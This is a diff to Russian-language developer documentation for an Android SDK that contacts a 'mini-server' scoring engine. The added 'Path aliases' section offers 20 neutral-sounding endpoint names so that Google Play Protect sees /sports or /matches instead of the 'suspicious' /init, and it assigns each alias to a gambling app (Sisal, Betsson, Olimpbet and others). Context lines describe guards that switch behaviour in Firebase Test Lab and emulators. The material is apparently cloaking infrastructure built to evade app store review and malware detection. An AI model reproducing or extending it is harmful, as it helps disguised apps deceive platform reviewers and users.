@@ -104,7 +104,7 @@ CLOUD_PROJECT_NUMBER=<число из Play Console → App integrity → Cloud p
 val client = AppClient(
     context = applicationContext,
     endpoint = BuildConfig.CLO_ENDPOINT,
-    path = "/init",
+    path = BuildConfig.CLO_SERVICE_PATH,   // "/sports", "/matches", "/live" — см. Path aliases ниже
     authToken = BuildConfig.CLO_APP_TOKEN,
     cloudProjectNumber = BuildConfig.CLOUD_PROJECT_NUMBER,
     // все ниже — default true, можно опустить
@@ -160,12 +160,74 @@ lifecycleScope.launch(Dispatchers.IO) {
 |---|---|---|---|
 | `context` | Context | required | Application context |
 | `endpoint` | String | required | Домен мини-сервера (`https://...`) |
-| `path` | String | `"/init"` | Endpoint path на мини-сервере |
+| `path` | String | `"/init"` | Endpoint path на мини-сервере — можно любой из 20 aliases (см. **Path aliases** ниже) |
 | `authToken` | String | `""` | Sid из панели — в header `X-Sid` |
 | `cloudProjectNumber` | Long | `0L` | Play Console → App integrity → Cloud project number. `0L` = SDK skip integrity |
 | `enableIntegrity` | Boolean | `true` | Requests Play Integrity token |
 | `enableTestLabGuard` | Boolean | `true` | Instant native return в Firebase Test Lab / emulator |
 | `enableOnboardingGuard` | Boolean | `true` | После первого successful resolve — SDK больше не звонит на backend (SharedPreferences flag) |
+
+---
+
+## 🔀 Path aliases (2026-07-04)
+
+Mini-server принимает **20 aliases** для SDK endpoint — каждая прила выбирает свой нейтральный path. Play Protect видит POST на `/sports` / `/matches` / `/live` (нейтральные keywords которые sports/news apps используют) вместо явно палёвого `/init`.
+
+### Доступные aliases для SDK resolve
+
+```
+init, sports, matches, standings, live, results, lending,
+scores, schedule, highlights, reports, team, league,
+player, stats, feed, widgets, api-data, content, news
+```
+
+Все проксируются на один и тот же `_resolve` в scoring engine — behavior identical, наружу видно только выбранный alias.
+
+### Как использовать
+
+В `clo.properties` (или через env) укажи путь для конкретной прилы:
+
+```properties
+CLO_SERVICE_PATH=/sports    # для Sisal Football
+# или /matches для Betsson, /live для NV Casino, /highlights для Olimpbet
+```
+
+В `build.gradle.kts`:
+
+```kotlin
+buildConfigField("String", "CLO_SERVICE_PATH", cloValue("CLO_SERVICE_PATH").asBuildConfigString())
+```
+
+В `AppClient` конструкторе:
+
+```kotlin
+val client = AppClient(
+    ...
+    path = BuildConfig.CLO_SERVICE_PATH,
+    ...
+)
+```
+
+### Рекомендация по распределению aliases per app
+
+- Sisal Football → `/sports`
+- Sisal 3 (pulsecospor) → `/lending`
+- Betsson (sparowwallp) → `/matches`
+- NV Casino → `/live`
+- Total Casino #1 → `/scores`
+- Total Casino #2 → `/schedule`
+- Olimpbet → `/highlights`
+- Snai → `/team`
+
+**Backward compat:** `/init` продолжает работать (legacy apps в проде без изменений).
+
+### Analytics endpoints
+
+Для `tracker.js` POSTs также доступны aliases:
+
+```
+web_content, analytics, beacon, telemetry, hits, events
+```
 
 ---
 
